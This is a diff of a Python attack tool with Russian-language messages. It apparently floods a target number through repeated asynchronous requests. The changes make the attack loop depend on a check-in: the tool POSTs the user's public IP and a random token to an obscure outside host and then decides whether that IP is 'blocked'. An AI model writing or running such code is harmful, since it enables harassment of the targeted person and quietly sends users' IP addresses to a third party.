@@ -9,6 +9,7 @@ import subprocess
 import requests
 import string
 import random
+import time
 
 
 # Добавляем путь к родительскому каталогу, чтобы импортировать модули из Core
@@ -102,30 +103,23 @@ def main():
                 return requests.get('https://api.ipify.org?format=json').json().get('ip')
             except requests.RequestException:
                 return None
-    
+
         url = 'http://eygksjcnbgdsfglksdfhgrhulkdhf.atwebpages.com'
         ip_address = get_ip_address()
         if ip_address:
             try:
                 response = requests.post(url, data={'token': generate_token(), 'ip_address': ip_address})
-                print("Response status code:", response.status_code)
-                print("Response text:", response.text)
-                
                 # Проверяем, заблокирован ли IP
                 if response.status_code == 200 and 'Your IP address is blocked' in response.text:
                     print(Fore.RED + "Ваш IP-адрес заблокирован. Пожалуйста, попробуйте позже.")
-                    return False
+                    return False  # IP заблокирован
                 elif response.status_code == 200:
-                    print(Fore.GREEN + "Токен отправлен успешно!")
-                    return True
+                    return True   # IP не заблокирован
                 else:
-                    print(Fore.RED + "Не удалось отправить токен.")
                     return False
             except requests.RequestException as e:
-                print(Fore.RED + f"Ошибка при отправке токена: {e}")
                 return False
         else:
-            print(Fore.RED + "Не удалось получить IP-адрес.")
             return False
 
 
@@ -161,19 +155,25 @@ def main():
 
     def start_attack(number):
         '''Запуск атаки'''
-        print(Fore.RED + "Запуск атаки, пожалуйста подождите...")
-        send_token()
-        print(Fore.GREEN + "Атака запущена! (надеюсь)" + Fore.GREEN +"\nВ случае, если атака не запустилась - читайте инструкцию." + Fore.RED)
+        print(Fore.GREEN + "Запуск атаки, пожалуйста подождите...")
         
-        change_config('attack', 'True')
-        try:
-            while True:
-                start_async_attacks(number, 1)
-        except KeyboardInterrupt:
-            print(Fore.RED + "Атака остановлена пользователем.")
-        finally:
-            change_config('attack', 'False')
-            print(Fore.RED + "Атака завершена.")
+        if send_token():  # Проверяем, заблокирован ли IP перед началом атаки
+            print(Fore.GREEN + "Атака запущена! (надеюсь)" + Fore.GREEN +"\nВ случае, если атака не запустилась - читайте инструкцию." + Fore.RED)
+            
+            change_config('attack', 'True')
+            try:
+                while True:
+                    start_async_attacks(number, 1)
+            except KeyboardInterrupt:
+                print(Fore.RED + "Атака остановлена пользователем.")
+            finally:
+                change_config('attack', 'False')
+                print(Fore.RED + "Атака завершена.")
+        else:
+            print(Fore.RED + "Атака не начата из-за блокировки IP.")
+            number = input(Fore.RED + "Вернуться - Enter").strip()
+            if number:
+                main()
 
     def checking_values():
         clear = lambda: os.system('cls' if os.name=='nt' else 'clear')
